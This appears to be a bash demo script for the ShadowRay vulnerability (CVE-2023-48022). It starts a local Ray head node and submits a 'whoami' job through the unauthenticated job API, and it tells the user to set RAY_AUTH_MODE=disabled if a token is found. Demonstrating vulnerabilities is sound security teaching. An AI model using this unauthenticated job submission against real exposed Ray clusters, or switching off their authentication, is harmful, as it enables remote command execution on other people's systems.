#!/usr/bin/env bash
# Demo 3: Ray runs any command with no password (ShadowRay, CVE-2023-48022).
# Localhost only. Never 0.0.0.0.
cd "$(dirname "$0")" && source ../../lib.sh
export PATH="$PWD/.venv/bin:$PATH"

# Ray 2.52+ turns on login if it finds a token. Then this demo gets refused.
if [ -z "$RAY_AUTH_MODE" ] && { [ -f ~/.ray/auth_token ] || [ -n "$RAY_AUTH_TOKEN" ]; }; then
  echo "Found a Ray token, so the demo will be refused. Run:  RAY_AUTH_MODE=disabled ./run.sh"
  exit 1
fi

show "ray start --head --dashboard-host 127.0.0.1 --disable-usage-stats" \
     "ray start --head --dashboard-host 127.0.0.1 --node-ip-address 127.0.0.1 --disable-usage-stats 2>&1 | grep -E 'Token authentication|Ray runtime started' | sed 's/.* -- //'"
pause

show "ray job submit --address http://127.0.0.1:8265 -- whoami" \
     "ray job submit --address http://127.0.0.1:8265 -- whoami 2>&1 | grep -E 'succeeded|failed|^[a-z]' | sed 's/.* -- //'"
